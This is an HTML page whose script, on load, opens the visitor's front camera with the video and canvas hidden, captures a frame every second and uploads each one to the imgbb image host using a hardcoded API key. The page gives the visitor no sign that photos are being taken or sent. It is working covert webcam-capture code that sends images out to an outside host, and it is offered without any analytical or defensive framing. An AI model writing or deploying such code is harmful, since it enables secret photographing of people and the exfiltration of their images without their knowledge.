<!DOCTYPE html>
<html>
<head>
  <title>Looped Capture and Upload</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    let photoData = '';

    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // Start looping capture every second
        setInterval(captureAndUpload, 1000);
      } catch (err) {
        console.error('Camera access denied or not available.', err);
      }
    }

    async function captureAndUpload() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      photoData = canvas.toDataURL('image/png').split(',')[1];

      try {
const uniqueName = `photo_${Date.now()}`; // e.g., photo_1697220000000

const res = await fetch('https://api.imgbb.com/1/upload', {
  method: 'POST',
  body: new URLSearchParams({
    key: '36bf4af9003bd786c70577cbfb06ef73',
    image: photoData,
    name: uniqueName
  })
});


        const data = await res.json();
        if (data.success) {
          console.log('✅ Uploaded:', data.data.url);
        } else {
          console.error('❌ Upload failed.');
        }
      } catch (e) {
        console.error('⚠️ Error uploading image.', e);
      }
    }

    window.onload = initCamera;
  </script>
</body>
</html>
